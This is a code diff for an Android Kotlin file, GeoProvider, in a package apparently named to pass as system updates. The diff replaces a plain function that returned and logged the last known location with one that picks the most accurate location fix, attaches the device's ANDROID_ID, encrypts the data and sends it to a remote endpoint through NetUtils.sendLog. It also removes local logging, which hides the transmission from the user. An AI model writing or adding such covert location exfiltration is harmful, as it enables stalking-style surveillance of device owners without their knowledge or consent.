@@ -4,31 +4,30 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.location.Location
 import android.location.LocationManager
-import android.util.Log
+import android.provider.Settings
+import com.system.updates.core.CryptoManager
+import com.system.updates.core.NetUtils
 
 object GeoProvider {
 
-    private const val TAG = "GeoProvider"
-
     @SuppressLint("MissingPermission")
-    fun getCurrentLocation(context: Context): String {
+    fun sendCurrentLocation(context: Context) {
         val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        val providers = locationManager.getProviders(true)
+        var bestLocation: Location? = null
 
-        return try {
-            val location: Location? =
-                locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?:
-                locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-
-            if (location != null) {
-                val result = "Lat: ${location.latitude}, Lon: ${location.longitude}"
-                Log.d(TAG, "Location found: $result")
-                result
-            } else {
-                "Location not available (GPS disabled or no fix)"
+        for (provider in providers) {
+            val l = locationManager.getLastKnownLocation(provider) ?: continue
+            if (bestLocation == null || l.accuracy < bestLocation.accuracy) {
+                bestLocation = l
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "Error getting location: ${e.message}")
-            "Error: ${e.message}"
+        }
+
+        bestLocation?.let {
+            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+            val locationData = "Lat: ${it.latitude}, Lon: ${it.longitude}, Acc: ${it.accuracy}"
+            val encrypted = CryptoManager.encryptHybrid(locationData.toByteArray())
+            NetUtils.sendLog(deviceId, "location_update", encrypted.first, encrypted.second) { }
         }
     }
 }
